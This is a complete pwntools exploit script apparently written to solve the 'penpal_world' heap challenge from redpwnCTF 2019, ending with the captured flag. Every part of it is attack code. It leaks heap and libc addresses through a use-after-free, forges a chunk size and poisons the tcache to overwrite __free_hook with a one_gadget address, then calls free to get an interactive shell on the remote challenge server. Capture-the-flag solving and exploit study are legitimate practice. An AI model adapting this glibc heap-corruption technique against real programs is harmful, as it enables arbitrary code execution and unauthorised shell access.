#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *
# CUSTOM FUNCTIONS
def _snd(s):
  io.send(str(s))
def _sndl(s):
  io.sendline(str(s))
def _snda(a,s):
  io.sendafter(str(a),str(s))
def _sndla(a,s):
  io.sendlineafter(str(a),str(s))
def _rcvu(s):
  return io.recvuntil(str(s))
def _rcva():
  return io.recvall()
def _rcvn(n):
  return io.recv(n)
context.terminal = ['tmux', 'split', '-h']

exe = context.binary = ELF('penpal_world')
env={'LD_PRELOAD':'./libc-2.27.so'}

host = args.HOST or 'chall.2019.redpwn.net'
port = int(args.PORT or 4010)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, env=env, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, env=env, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

iii=0
def create(idx):
    global iii
    print (iii)
    iii+=1
    _sndl(1)
    _rcvu('?')
    _sndl(idx)

def edit(idx, s):
    global iii
    print (iii)
    iii+=1
    _sndl(2)
    _rcvu('?')
    _sndl(idx)
    _rcvu('.')
    _snd(str(s))

def delete(idx):
    global iii
    print (iii)
    iii+=1
    _sndl(3)
    _rcvu('?')
    _sndl(idx)

def read(idx):
    global iii
    print (iii)
    iii+=1
    _sndl(4)
    _rcvu('?')
    _sndl(idx)

create(0)
create(1)

delete(0)
delete(1)
read(1)

data = _rcvu('OPTIONS').replace('OPTIONS', '').strip()
print (data)
heap_start = unpack(data.ljust(8, "\x00"))
log.info(hex(heap_start))

for i in range(0x10 - 2):
    create(1)
edit(1, p64(0x0) * 2 +  p64(0x0) + p64(0x19) + p64(0x0) + p64(0x0) + p64(0x19))
delete(1)
delete(1)
edit(1, p64(heap_start + 0x10))
edit(0, p64(0x0) + p64(0x421) + p64(0x0))

create(1)
create(1)

delete(1)
read(1)

data = _rcvu('OPTIONS').replace('OPTIONS', '').strip()
print (data)
libc_start = unpack(data.ljust(8, "\x00")) - 0x3ebca0
log.info(hex(libc_start))
libc = ELF('libc-2.27.so')
libc.address = libc_start
gadgets=[0x4f2c5, 0x4f322, 0x10a38c]
#create(0)
delete(0)
log.info(hex(libc.symbols['__malloc_hook']))
log.info(hex(libc.symbols['__free_hook']))
edit(0, p64(libc.symbols['__free_hook']))
create(0)
create(0)
edit(0, p64(libc.address + gadgets[1]))
delete(0)

io.interactive()
# flag{0h_n0e5_sW1p3r_d1D_5w!peEEeE}

